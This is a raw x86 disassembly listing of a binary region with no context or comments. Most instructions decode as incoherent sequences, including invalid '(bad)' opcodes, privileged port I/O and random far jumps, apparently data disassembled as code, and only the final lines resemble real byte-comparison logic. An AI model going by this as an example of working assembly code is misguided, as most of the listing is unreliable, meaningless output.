  417bf0:	xchg   DWORD PTR [ecx+0x65],edi
  417bf3:	jle    0x417bfa
  417bf5:	or     ch,al
  417bf7:	fadd   DWORD PTR [esi+0x1ee017e0]
  417bfd:	add    al,0xc4
  417bff:	loopne 0x417c06
  417c01:	pop    eax
  417c02:	mov    edx,0xc2c6cb9e
  417c07:	mov    fs,WORD PTR [esi+0x256542ef]
  417c0d:	out    dx,eax
  417c0e:	adc    al,0x8a
  417c10:	je     0x417c72
  417c12:	ss inc edx
  417c14:	call   0x666ea196
  417c19:	ret    
  417c1a:	imul   esi,esp,0x21
  417c1d:	sbb    DWORD PTR [eax],edx
  417c1f:	pushf  
  417c20:	aam    0x93
  417c22:	push   ebp
  417c23:	xchg   ebx,eax
  417c24:	dec    edi
  417c25:	or     edi,esi
  417c27:	mov    eax,ds:0xceb9f8b2
  417c2c:	aad    0x86
  417c2e:	and    al,0x6a
  417c30:	mov    fs,WORD PTR [edi]
  417c32:	fwait
  417c33:	(bad)  
  417c34:	mov    BYTE PTR [edi+0x1a],cl
  417c37:	fs pop es
  417c39:	pop    edi
  417c3a:	push   es
  417c3b:	xchg   esi,eax
  417c3c:	stc    
  417c3d:	jmp    0x7de23569
  417c42:	cdq    
  417c43:	das    
  417c44:	xor    dl,BYTE PTR [eax-0x59]
  417c47:	jge    0x417bec
  417c49:	cli    
  417c4a:	pop    ecx
  417c4b:	hlt    
  417c4c:	stos   DWORD PTR es:[edi],eax
  417c4d:	aad    0x72
  417c4f:	hlt    
  417c50:	xchg   ebx,eax
  417c51:	pushf  
  417c52:	pop    ecx
  417c53:	aas    
  417c54:	sar    ah,0x79
  417c57:	fwait
  417c58:	dec    ebx
  417c59:	pop    es
  417c5a:	jle    0x417c68
  417c5c:	test   eax,0x2ab0e93c
  417c61:	pop    ebp
  417c62:	fdivr  st(0),st
  417c64:	pop    es
  417c65:	pop    edx
  417c66:	mov    ebp,DWORD PTR ds:0x180f2afb
  417c6c:	mov    edi,0xb77d7bf
  417c71:	lahf   
  417c72:	scas   eax,DWORD PTR es:[edi]
  417c73:	mov    ebx,0x1b703bc5
  417c78:	shr    BYTE PTR [esi+edi*1],0x75
  417c7c:	jg     0x417cba
  417c7e:	mov    eax,ds:0x973316af
  417c83:	jne    0x417cce
  417c85:	loopne 0x417c27
  417c87:	lds    eax,FWORD PTR [eax-0xb]
  417c8a:	pop    edx
  417c8b:	not    al
  417c8d:	jbe    0x417c3f
  417c8f:	jno    0x417cc1
  417c91:	dec    edx
  417c92:	or     eax,0xd92fec94
  417c97:	pop    eax
  417c98:	or     DWORD PTR [edx-0x7f],esi
  417c9b:	mov    esp,0x7ec0d2c
  417ca0:	inc    ebx
  417ca1:	addr16 test al,0x39
  417ca4:	out    0xd6,al
  417ca6:	cmc    
  417ca7:	ja     0x417d20
  417ca9:	inc    edx
  417caa:	xchg   DWORD PTR [ecx-0x7ec07aa4],ecx
  417cb0:	mov    ebp,0x51a64cf7
  417cb5:	dec    ebx
  417cb6:	fisttp QWORD PTR [edi]
  417cb8:	add    BYTE PTR [edx+0x251478d5],ah
  417cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cbf:	sahf   
  417cc0:	xor    al,0x53
  417cc2:	sbb    eax,0x7416811a
  417cc7:	mov    al,ds:0xc4ee8c3a
  417ccc:	jns    0x417c56
  417cce:	mov    esp,0xc61ce975
  417cd3:	mov    eax,ds:0x6e472593
  417cd8:	icebp  
  417cd9:	(bad)  
  417cda:	inc    eax
  417cdb:	mov    eax,ds:0x65923b9a
  417ce0:	lds    esi,FWORD PTR [edi]
  417ce2:	push   ds
  417ce3:	mov    edx,0xfc2004da
  417ce8:	and    ah,BYTE PTR [eax]
  417cea:	repz enter 0x70f4,0x6b
  417cef:	mov    esi,0x3ea0930c
  417cf4:	and    al,BYTE PTR [eax]
  417cf6:	cmp    eax,0x551e16b2
  417cfb:	and    BYTE PTR [edx],al
  417cfd:	and    eax,0x324588e
  417d02:	push   esi
  417d03:	aam    0x51
  417d05:	stc    
  417d06:	push   ss
  417d07:	sbb    DWORD PTR [ecx],esp
  417d09:	jb     0x417d16
  417d0b:	mov    dl,0x1
  417d0d:	loopne 0x417d82
  417d0f:	outs   dx,DWORD PTR ds:[esi]
  417d10:	(bad)  
  417d11:	jae    0x417d5b
  417d13:	xor    al,0x1a
  417d15:	sub    eax,0xb725fcab
  417d1a:	cwde   
  417d1b:	jmp    DWORD PTR [ecx+0x16]
  417d1e:	shl    BYTE PTR [eax+0x490226ea],1
  417d24:	xchg   edi,eax
  417d25:	ins    DWORD PTR es:[edi],dx
  417d26:	jae    0x417d53
  417d28:	cmp    ebx,DWORD PTR [esi+0x116a9c80]
  417d2e:	pushf  
  417d2f:	mov    ds:0xd8d620ff,eax
  417d34:	dec    ebx
  417d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d36:	xlat   BYTE PTR ds:[ebx]
  417d37:	xor    al,0x89
  417d39:	mov    ds:0xe5dac7a0,eax
  417d3e:	push   ebp
  417d3f:	sub    ch,BYTE PTR [eax-0x74]
  417d42:	arpl   WORD PTR [ebp+0x14af8152],cx
  417d48:	stos   BYTE PTR es:[edi],al
  417d49:	jae    0x417d71
  417d4b:	xchg   ecx,eax
  417d4c:	daa    
  417d4d:	xor    al,0x75
  417d4f:	aad    0x8d
  417d51:	push   esp
  417d52:	sbb    bh,ch
  417d54:	addr16 jns 0x417cf7
  417d57:	jbe    0x417d90
  417d59:	ins    DWORD PTR es:[edi],dx
  417d5a:	sti    
  417d5b:	ss xor eax,0xe9e4c9e1
  417d61:	retf   0xf5e6
  417d64:	scas   al,BYTE PTR es:[edi]
  417d65:	sahf   
  417d66:	dec    esi
  417d67:	fst    st(1)
  417d69:	scas   eax,DWORD PTR es:[edi]
  417d6a:	mov    ds:0x9c6134b1,al
  417d6f:	push   0x6b848095
  417d74:	jmp    0xb8b31c30
  417d79:	jp     0x417d59
  417d7b:	xchg   ebx,eax
  417d7c:	popf   
  417d7d:	or     ah,BYTE PTR [eax-0x58]
  417d80:	popf   
  417d81:	adc    ecx,DWORD PTR [esi+0x4423c0af]
  417d87:	stos   BYTE PTR es:[edi],al
  417d88:	mov    cl,0x22
  417d8a:	(bad)  
  417d8c:	fisubr WORD PTR [edi]
  417d8e:	imul   ebp,DWORD PTR [ebx],0xa60cd2c7
  417d94:	cdq    
  417d95:	in     eax,dx
  417d96:	xchg   esp,eax
  417d97:	jl     0x417d34
  417d99:	jae    0x417dd0
  417d9b:	xor    al,0x17
  417d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d9e:	mov    dh,0x4f
  417da0:	lahf   
  417da1:	mov    DWORD PTR [ecx-0x10fe4a55],esp
  417da7:	pop    esi
  417da8:	jl     0x417daf
  417daa:	sub    bh,BYTE PTR [esi]
  417dac:	(bad)
  417db0:	rcl    DWORD PTR [esi+edx*2+0x17e1caef],cl
  417db7:	imul   edx,DWORD PTR [esi],0xf11e76d
  417dbd:	sub    bh,cl
  417dbf:	clc    
  417dc0:	aaa    
  417dc1:	mov    al,ds:0x80279593
  417dc6:	jge    0x417d71
  417dc8:	int    0x77
  417dca:	adc    eax,0xa2e065cc
  417dcf:	mov    bl,0x88
  417dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dd2:	or     al,0x77
  417dd4:	mov    WORD PTR [edi+0x6d],ss
  417dd7:	or     BYTE PTR [eax],dl
  417dd9:	aad    0xc1
  417ddb:	add    esp,ebp
  417ddd:	xchg   DWORD PTR [ebx-0x79],edi
  417de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de1:	cli    
  417de2:	fcomp  st(4)
  417de4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de5:	dec    ebp
  417de6:	fisttp QWORD PTR [edi-0x71]
  417de9:	sahf   
  417dea:	test   DWORD PTR [edi-0x709e49c6],edx
  417df0:	mov    bl,0x24
  417df2:	pop    ecx
  417df3:	pusha  
  417df4:	mov    ah,0xb4
  417df6:	aaa    
  417df7:	aaa    
  417df8:	out    0x14,eax
  417dfa:	in     al,0xac
  417dfc:	test   esp,0x46087a52
  417e02:	and    al,0x18
  417e05:	sub    esp,esi
  417e07:	adc    edi,DWORD PTR [ebx-0x33]
  417e0a:	call   0x5719:0x9a5d73b2
  417e11:	xor    esp,edi
  417e13:	aam    0xcc
  417e15:	cs aas 
  417e17:	adc    eax,ebp
  417e19:	(bad)  
  417e1a:	pop    ss
  417e1b:	iret   
  417e1c:	push   ebp
  417e1d:	add    eax,DWORD PTR [edx-0x61]
  417e20:	pop    esp
  417e21:	scas   eax,DWORD PTR es:[edi]
  417e22:	lahf   
  417e23:	dec    ebp
  417e24:	adc    edi,DWORD PTR [edx-0x77]
  417e27:	(bad)  
  417e29:	inc    eax
  417e2a:	mov    bl,0x8a
  417e2c:	scas   eax,DWORD PTR es:[edi]
  417e2d:	sbb    eax,0xd192e30e
  417e32:	call   0xc516eea5
  417e37:	fcmovnu st,st(2)
  417e39:	pop    esp
  417e3a:	in     eax,0x1
  417e3c:	loop   0x417e78
  417e3e:	lods   eax,DWORD PTR ds:[esi]
  417e3f:	sbb    esp,DWORD PTR [ebp-0x3c491d1f]
  417e45:	pusha  
  417e46:	adc    al,0x9c
  417e48:	loope  0x417e10
  417e4a:	icebp  
  417e4b:	mov    al,0xa6
  417e4d:	sub    al,dl
  417e4f:	inc    esi
  417e50:	inc    ebp
  417e51:	pop    ebp
  417e52:	inc    esp
  417e53:	icebp  
  417e54:	fistp  WORD PTR [esp+edx*8+0x71188e0]
  417e5b:	(bad)  
  417e5c:	pop    esi
  417e5d:	xchg   DWORD PTR [ebx+0x36c5a894],esi
  417e63:	sub    eax,0x6355622d
  417e68:	fwait
  417e69:	clc    
  417e6a:	xchg   esi,eax
  417e6b:	lods   eax,DWORD PTR ds:[esi]
  417e6c:	mov    esp,0xc04aabf9
  417e71:	in     al,dx
  417e72:	nop
  417e73:	xlat   BYTE PTR ds:[ebx]
  417e74:	jnp    0x417e84
  417e76:	out    dx,al
  417e77:	fucompp 
  417e79:	sbb    eax,0x5f794543
  417e7e:	add    eax,0xd60c5c56
  417e83:	sbb    bh,bh
  417e85:	popf   
  417e86:	push   ds
  417e87:	lods   eax,DWORD PTR ds:[esi]
  417e88:	dec    esp
  417e89:	add    DWORD PTR [ecx+0x2e328b17],edx
  417e8f:	mov    DWORD PTR [esi],ebp
  417e91:	sub    eax,0x786bef3e
  417e96:	mov    dl,al
  417e98:	mov    ds:0x2a291040,al
  417e9d:	sub    al,0x20
  417e9f:	ja     0x417e2b
  417ea1:	sub    al,BYTE PTR [ecx+eax*1]
  417ea4:	dec    ebx
  417ea5:	pop    ecx
  417ea6:	(bad)  
  417ea7:	daa    
  417ea8:	daa    
  417ea9:	sbb    eax,0xe259c8fd
  417eae:	dec    ebx
  417eaf:	add    BYTE PTR [ecx+0x3c6a162c],al
  417eb5:	lods   al,BYTE PTR ds:[esi]
  417eb6:	add    BYTE PTR [edx+ecx*8],al
  417eb9:	jns    0x417e7d
  417ebb:	push   edx
  417ebc:	xchg   ebp,eax
  417ebd:	lahf   
  417ebe:	mov    BYTE PTR [esi],bl
  417ec0:	les    esp,FWORD PTR [ebx+0x32]
  417ec3:	jo     0x417e56
  417ec5:	pop    ebx
  417ec6:	inc    eax
  417ec7:	mov    eax,0x35d33a34
  417ecc:	mov    ds:0x9011ed61,al
  417ed1:	inc    esi
  417ed2:	mov    edx,0xb64d4e91
  417ed7:	(bad)  
  417ed8:	das    
  417ed9:	dec    esi
  417eda:	dec    ebp
  417edb:	data16 cmc 
  417edd:	cwde   
  417ede:	mov    edx,0xa019bce1
  417ee3:	and    ch,al
  417ee5:	in     eax,0xa7
  417ee7:	and    bl,dl
  417ee9:	mov    eax,0xbc7f1a88
  417eee:	jmp    0x9d341bfa
  417ef3:	pop    ss
  417ef4:	jl     0x417ed3
  417ef6:	add    al,0x2b
  417ef8:	pop    ss
  417ef9:	pushf  
  417efa:	ret    
  417efb:	dec    esi
  417efc:	inc    edi
  417efd:	popf   
  417efe:	aas    
  417eff:	xlat   BYTE PTR ds:[ebx]
  417f00:	addr16 xor al,0x54
  417f03:	and    BYTE PTR [ebx-0x53c8a330],cl
  417f09:	outs   dx,BYTE PTR ds:[esi]
  417f0a:	dec    ebx
  417f0b:	xor    ch,BYTE PTR [ebx+0x137bb6b]
  417f11:	push   ebp
  417f12:	pop    ss
  417f13:	cmp    DWORD PTR [eax+0x7cbdb81a],0x53cda203
  417f1d:	mov    dl,0x62
  417f1f:	stc    
  417f20:	call   0x695d:0xe9999bb9
  417f27:	jmp    ebp
  417f29:	jb     0x417f7b
  417f2b:	adc    dl,BYTE PTR [edi-0x42ebd8a6]
  417f31:	dec    esp
  417f32:	std    
  417f33:	mov    cl,0xe7
  417f35:	and    cl,ch
  417f37:	cmovae esi,DWORD PTR [ebx+0x3e]
  417f3b:	call   0x427c0773
  417f40:	pushf  
  417f41:	mov    ebp,0x4f04cb68
  417f46:	adc    BYTE PTR [ebp-0x7e],dl
  417f49:	arpl   WORD PTR [edi],bp
  417f4b:	aas    
  417f4c:	sub    eax,0x1f9006e9
  417f51:	(bad)  
  417f52:	repz mov ah,0xb5
  417f55:	bsf    edi,DWORD PTR [ebx]
  417f58:	add    ah,BYTE PTR [edi+0x6d]
  417f5b:	out    dx,eax
  417f5c:	push   ebx
  417f5d:	test   BYTE PTR [ebp+ecx*8-0x52ee7e1a],al
  417f64:	(bad)  
  417f65:	std    
  417f66:	std    
  417f67:	jmp    0x417f8d
  417f69:	pop    ecx
  417f6a:	jo     0x417f1d
  417f6c:	inc    esi
  417f6d:	xor    DWORD PTR [ecx-0x6e330389],0x1b
  417f74:	lods   al,BYTE PTR ds:[esi]
  417f75:	pusha  
  417f76:	fcmovnbe st,st(4)
  417f78:	loope  0x417efe
  417f7a:	push   eax
  417f7b:	retf   0x8fe4
  417f7e:	test   cl,dl
  417f80:	les    edi,FWORD PTR [edi+0x1c0a1efc]
  417f86:	ds xor cl,BYTE PTR es:[ecx+eax*2]
  417f8b:	std    
  417f8c:	xchg   BYTE PTR [ecx+0x7285f7e1],bh
  417f92:	fsub   DWORD PTR [esi-0x6e1b9c15]
  417f98:	jg     0x417f49
  417f9a:	test   eax,0x96b5071f
  417f9f:	es jne 0x417f47
  417fa2:	into   
  417fa3:	or     DWORD PTR [eax-0x69f8d1b2],ebx
  417fa9:	fdivr  DWORD PTR [esp+edx*4+0x72d57f13]
  417fb0:	add    BYTE PTR [esp+ebx*2],ah
  417fb3:	es cli 
  417fb5:	pop    ebx
  417fb6:	icebp  
  417fb7:	sbb    ebx,DWORD PTR [edx+eiz*8+0x7b]
  417fbb:	xor    eax,0x35dbda52
  417fc0:	ror    BYTE PTR [ecx+0x29248f8a],cl
  417fc6:	mov    ebp,0xc2409c2a
  417fcb:	ret    
  417fcc:	ins    DWORD PTR es:[edi],dx
  417fcd:	shl    BYTE PTR [ecx-0x765b97c5],cl
  417fd3:	(bad)  
  417fd4:	and    ah,BYTE PTR [esi]
  417fd6:	add    edi,edi
  417fd8:	out    dx,al
  417fd9:	pop    es
  417fda:	call   0x47b39685
  417fdf:	test   BYTE PTR [esi],0x79
  417fe2:	out    dx,al
  417fe3:	sti    
  417fe4:	adc    BYTE PTR [ebx-0x74],cl
  417fe7:	mov    esp,0xc48aae71
  417fec:	sub    al,0x56
  417fee:	stos   BYTE PTR es:[edi],al
  417fef:	mov    cl,0x7f
  417ff1:	jmp    0x418033
  417ff3:	push   0xb0c867bc
  417ff8:	cld    
  417ff9:	loope  0x417fdb
  417ffb:	retf   0x982c
  417ffe:	cmp    ah,ch
  418000:	push   0x3e
  418002:	ror    BYTE PTR [edx-0x67394061],1
  418008:	pop    eax
  418009:	in     al,0x85
  41800b:	dec    edx
  41800c:	js     0x418029
  41800e:	fbstp  TBYTE PTR [edx-0x419c2d9a]
  418014:	sub    DWORD PTR [edx],edx
  418016:	adc    al,0xca
  418018:	repnz cmc 
  41801a:	mov    ah,0x41
  41801c:	inc    DWORD PTR [ebx+0x3d4a1d05]
  418022:	lds    edi,FWORD PTR [edi-0x544ca49b]
  418028:	nop
  418029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41802a:	call   0xfa2c3d14
  41802f:	pop    es
  418030:	mov    ch,0xcc
  418032:	mov    ch,0x74
  418034:	arpl   WORD PTR [eax*1-0x3baa3ebf],bp
  41803b:	push   ss
  41803c:	cmc    
  41803d:	or     al,0x6
  41803f:	and    DWORD PTR [ecx+edi*8],0x5f
  418043:	sti    
  418044:	cmp    dh,BYTE PTR [esi+0x31]
  418047:	push   ebx
  418048:	pop    esp
  418049:	or     al,0xd4
  41804b:	adc    BYTE PTR [eax],dl
  41804d:	and    ecx,DWORD PTR [edi-0x66]
  418050:	mov    eax,0xe198e1a3
  418055:	mov    esi,0x799265ca
  41805a:	mov    ds:0xc22c6d09,eax
  41805f:	mov    edx,0xd079a8c5
  418064:	mov    dl,bl
  418066:	add    al,0xb7
  418068:	sar    dl,0x3
  41806b:	out    0x51,al
  41806d:	jmp    0x41805c
  41806f:	ja     0x417ffb
  418071:	dec    ebx
  418072:	cmp    al,BYTE PTR [edi+0x20523db4]
  418078:	add    al,0x33
  41807a:	push   edi
  41807b:	(bad)  
  41807c:	and    BYTE PTR [edi+0x79a38077],cl
  418082:	push   ebx
  418083:	sbb    BYTE PTR [edi+0x6f200d83],bl
  418089:	adc    al,0xd5
  41808b:	repnz retf 0xf165
  41808f:	retf   
  418090:	mov    cl,0x97
  418092:	js     0x4180e0
  418094:	jnp    0x4180b3
  418096:	or     al,0x10
  418098:	mov    ebx,0xcc298d59
  41809d:	add    eax,0x1d36a9d8
  4180a2:	stos   DWORD PTR es:[edi],eax
  4180a3:	xchg   edx,eax
  4180a4:	dec    ebx
  4180a5:	jnp    0x4180b7
  4180a7:	adc    bh,BYTE PTR [ecx+0xd]
  4180aa:	(bad)  
  4180ab:	cmc    
  4180ac:	lods   al,BYTE PTR ds:[esi]
  4180ad:	lods   al,BYTE PTR es:[esi]
  4180af:	add    eax,0x14ba7044
  4180b4:	mov    DWORD PTR [edi+esi*1-0x11a93e58],0xa24bcc4a
  4180bf:	mov    edi,0x325e69e8
  4180c4:	cmp    BYTE PTR [edi+0x47],0xd0
  4180c8:	cli    
  4180c9:	push   esp
  4180ca:	add    bl,al
  4180cc:	sahf   
  4180cd:	inc    edx
  4180ce:	pop    esp
  4180cf:	pop    esp
  4180d0:	push   ebp
  4180d1:	push   cs
  4180d2:	dec    esp
  4180d3:	jl     0x41807f
  4180d5:	or     dh,BYTE PTR [edx+0x6b346d7f]
  4180db:	in     eax,dx
  4180dc:	test   BYTE PTR [edi+0x29d9911d],cl
  4180e2:	dec    ecx
  4180e3:	add    edx,edx
  4180e5:	push   ds
  4180e6:	mov    edi,0x4a081927
  4180eb:	test   BYTE PTR [edx+0x67e3d9b7],0xdf
  4180f2:	aas    
  4180f3:	retf   0x7b6
  4180f6:	out    dx,eax
  4180f7:	ins    BYTE PTR es:[edi],dx
  4180f8:	mul    DWORD PTR [ebx]
  4180fa:	push   ss
  4180fb:	push   ebx
  4180fc:	or     BYTE PTR [esi-0x77d656c4],dh
  418102:	ret    
  418103:	stos   BYTE PTR es:[edi],al
  418104:	push   cs
  418105:	and    edx,DWORD PTR [eax]
  418107:	push   0xffffffda
  418109:	daa    
  41810a:	jbe    0x418103
  41810c:	cs pop esi
  41810e:	jno    0x41815f
  418110:	or     eax,0x72260ddc
  418115:	inc    edi
  418116:	cwde   
  418117:	sub    al,0x36
  418119:	inc    esi
  41811a:	jmp    0xa7bf:0xf5480603
  418121:	cwde   
  418122:	pop    es
  418123:	ja     0x41817e
  418125:	mov    ebx,0xd0225111
  41812a:	jle    0x41816f
  41812c:	mov    esi,DWORD PTR [ebx-0x6efbd5f6]
  418132:	jne    0x418159
  418134:	retf   0x9207
  418137:	rcl    BYTE PTR [ecx],cl
  418139:	xchg   edi,eax
  41813a:	fcmove st,st(3)
  41813c:	cmp    eax,0x6a1a26bf
  418141:	adc    ecx,DWORD PTR [esp+edx*1-0x27c146f9]
  418148:	and    ecx,DWORD PTR [ecx-0x16ffd7d3]
  41814e:	(bad)  
  41814f:	dec    esi
  418150:	push   edi
  418151:	mov    ecx,0xcde7dcfb
  418156:	rcr    edx,1
  418158:	jmp    0x2d12:0x5940bbe4
  41815f:	inc    ebp
  418160:	inc    eax
  418161:	loop   0x4180ff
  418163:	es jno 0x418120
  418166:	xor    BYTE PTR [esi],dl
  418168:	inc    ebp
  418169:	xchg   esp,eax
  41816a:	xchg   ebp,eax
  41816b:	xchg   edi,eax
  41816c:	popa   
  41816d:	out    dx,al
  41816e:	mov    BYTE PTR [ecx-0x21],ah
  418171:	clc    
  418172:	add    al,0x42
  418174:	mov    DWORD PTR ds:0x2bf8f2f8,edx
  41817a:	fucompp 
  41817c:	xor    cl,BYTE PTR [edx+0x61]
  41817f:	push   edx
  418180:	in     al,dx
  418181:	cmp    eax,0x897793ef
  418186:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  418188:	scas   eax,DWORD PTR es:[edi]
  418189:	pop    ebp
  41818a:	ss push 0x1c
  41818d:	jle    0x41811e
  41818f:	lds    edi,FWORD PTR [edx]
  418191:	or     al,0xf4
  418193:	push   cs
  418194:	inc    ebx
  418195:	repz fldenv [ecx-0xe343345]
  41819c:	jns    0x4181a6
  41819e:	jecxz  0x4181ef
  4181a0:	jle    0x418207
  4181a2:	fst    DWORD PTR ds:0x5e9924aa
  4181a8:	dec    ecx
  4181a9:	add    DWORD PTR [edi+0x54],0xb3e037e4
  4181b0:	cdq    
  4181b1:	lahf   
  4181b2:	out    0xcc,al
  4181b4:	imul   eax,DWORD PTR [ebp+ebx*1-0x9359d09],0xffffffbb
  4181bc:	ret    0xe9ed
  4181bf:	shl    DWORD PTR ds:0x3fc6ddb7,0xbc
  4181c6:	xchg   esi,ecx
  4181c8:	fdivr  DWORD PTR ss:[bx+di]
  4181cc:	xchg   edi,eax
  4181cd:	cdq    
  4181ce:	nop
  4181cf:	xor    bh,bl
  4181d1:	scas   eax,DWORD PTR es:[edi]
  4181d2:	adc    ebp,DWORD PTR [ebp-0x30ec63ab]
  4181d8:	in     eax,0x1d
  4181da:	cmpps  xmm1,xmm4,0x8
  4181de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181df:	cdq    
  4181e0:	push   es
  4181e1:	sbb    BYTE PTR [eax-0x38d02854],ah
  4181e7:	imul   eax,ebp,0xd471b1d2
  4181ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181ee:	adc    bl,BYTE PTR [esi]
  4181f0:	mov    edi,0x79996c7e
  4181f5:	cmp    al,0x63
  4181f7:	pop    ds
  4181f8:	and    BYTE PTR [edx],cl
  4181fa:	daa    
  4181fb:	pop    ecx
  4181fc:	push   edx
  4181fd:	add    al,dh
  4181ff:	ja     0x4181d2
  418201:	jb     0x418282
  418203:	fiadd  WORD PTR [edi-0x44]
  418206:	data16 loopne 0x418286
  418209:	sbb    al,0xf4
  41820b:	addr16 add eax,0xc4ea9f8f
  418211:	imul   esp,DWORD PTR [eax+0x1760e55f],0xffffff85
  418218:	(bad)  
  418219:	and    ch,BYTE PTR [ebx+0x6e316be]
  41821f:	arpl   WORD PTR [eax+0x7e],sp
  418222:	pop    es
  418223:	push   cs
  418224:	and    edx,DWORD PTR [esi-0x40545736]
  41822a:	jae    0x418237
  41822c:	lods   eax,DWORD PTR ds:[esi]
  41822d:	xor    al,BYTE PTR [edi-0x74]
  418230:	ret    
  418231:	mov    ch,0x12
  418233:	or     al,0x56
  418235:	sbb    edx,DWORD PTR ds:0x4fb22bf9
  41823b:	cmp    dl,BYTE PTR [ecx]
  41823d:	cs retf 
  41823f:	push   cs
  418240:	push   edx
  418241:	jmp    0x7319:0xea510687
  418248:	push   cs
  418249:	out    0xff,eax
  41824b:	into   
  41824c:	stos   BYTE PTR es:[edi],al
  41824d:	dec    edi
  41824e:	mov    bl,0x37
  418250:	or     DWORD PTR [edx],ebp
  418252:	dec    esi
  418253:	sub    al,0x5e
  418255:	add    DWORD PTR [edi-0x543510ab],esi
  41825b:	jns    0x41827e
  41825d:	daa    
  41825e:	hlt    
  41825f:	inc    esi
  418260:	mov    ebx,0x5fa050c
  418265:	push   edi
  418266:	sbb    edx,DWORD PTR [ebp-0x61c2cbcb]
  41826c:	add    ebp,DWORD PTR [ecx+0x77]
  41826f:	popf   
  418270:	dec    esi
  418271:	jns    0x4181f8
  418273:	pop    ds
  418274:	pop    esp
  418275:	lock mov ecx,DWORD PTR [eax-0x217e35b5]
  41827c:	loopne 0x418299
  41827e:	xchg   edi,eax
  41827f:	popa   
  418280:	jb     0x418211
  418282:	repz mov bh,0xc6
  418285:	adc    al,0x17
  418287:	mov    edi,0xcc67f2f
  41828c:	mov    esi,0xd02ab269
  418291:	adc    bh,BYTE PTR [esi]
  418293:	mov    esp,0xaf2eb400
  418298:	push   cs
  418299:	sahf   
  41829a:	cmp    cl,BYTE PTR [edi+0x263fc2d4]
  4182a0:	or     al,0x14
  4182a2:	loopne 0x418281
  4182a4:	jnp    0x418317
  4182a6:	in     eax,0xbd
  4182a8:	adc    DWORD PTR [edi],ebx
  4182aa:	and    al,ah
  4182ac:	fadd   QWORD PTR [eax+0x4a962d1]
  4182b2:	ds jge 0x4182b9
  4182b5:	imul   ebx,DWORD PTR [eax],0xffffff8f
  4182b8:	and    BYTE PTR [eax+edx*4-0x42],dh
  4182bc:	cmp    dh,dh
  4182be:	shr    DWORD PTR [esi],1
  4182c0:	cmp    ch,bh
  4182c2:	aad    0xc2
  4182c4:	xchg   esi,eax
  4182c5:	jmp    0xa664:0x713b2a9b
  4182cc:	jecxz  0x4182d9
  4182ce:	xor    DWORD PTR [ebx],ebp
  4182d0:	mov    al,ds:0x3d891bf6
  4182d5:	mov    al,ds:0xa62de8d5
  4182da:	jecxz  0x4182ac
  4182dc:	push   ds
  4182dd:	(bad)  
  4182de:	fild   WORD PTR [edx]
  4182e0:	xchg   ebx,eax
  4182e1:	xor    al,0x1b
  4182e3:	mov    eax,ds:0x4dd7da45
  4182e8:	xchg   ebx,eax
  4182e9:	int3   
  4182ea:	dec    esi
  4182eb:	add    BYTE PTR [ecx],bh
  4182ed:	cmp    DWORD PTR [edi-0x5f36a3d0],eax
  4182f3:	stos   DWORD PTR es:[edi],eax
  4182f4:	mov    esi,0x9d26bedc
  4182f9:	cmp    eax,0x722bae4c
  4182fe:	xchg   DWORD PTR [eax+0x7c00722],edi
  418304:	pop    ss
  418305:	and    BYTE PTR [ecx-0x249663eb],0xc4
  41830c:	imul   ebx,ebp,0xffffff8d
  41830f:	push   ss
  418310:	jecxz  0x418328
  418312:	xchg   BYTE PTR ds:0x91d2c44c,dh
  418318:	add    DWORD PTR [esi-0xc5f8522],0xffffffdd
  41831f:	lds    ecx,FWORD PTR [ebx]
  418321:	js     0x4182ca
  418323:	addr16 fadd st(6),st
  418326:	fs arpl di,si
  418329:	inc    eax
  41832a:	mov    ds:0xc27480b,eax
  41832f:	(bad)  
  418330:	and    BYTE PTR [ebx-0x39],bl
  418333:	jo     0x418325
  418335:	sar    BYTE PTR [ecx],0x97
  418338:	aad    0xd7
  41833a:	sub    edx,ebp
  41833c:	push   es
  41833d:	push   cs
  41833e:	popa   
  41833f:	test   al,0x97
  418341:	fld    QWORD PTR [edi+0x6eecd7bc]
  418347:	ror    DWORD PTR ds:0xc4e4780e,1
  41834d:	(bad)  
  41834e:	gs jge 0x418399
  418351:	jo     0x41839c
  418353:	ds stc 
  418355:	cmp    eax,0x3ab80ef
  41835a:	sub    esp,ebp
  41835c:	dec    edx
  41835d:	sbb    BYTE PTR [ecx+0x26ed3ff3],0x4a
  418364:	adc    BYTE PTR [esi+0x59698457],ah
  41836a:	push   ds
  41836b:	push   esi
  41836c:	dec    ebx
  41836d:	cmp    dh,bh
  41836f:	pop    ebp
  418370:	fwait
  418371:	div    DWORD PTR [ebx]
  418373:	mov    al,0x20
  418375:	lds    edi,FWORD PTR [esi+edi*1]
  418378:	adc    al,0x41
  41837b:	and    eax,DWORD PTR [esi]
  41837d:	push   edi
  41837e:	dec    esp
  41837f:	mov    ebp,0x660ebb1a
  418384:	imul   ebx,esp,0xf1850fd3
  41838a:	mov    eax,0x558bffff
  41838f:	hlt    
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
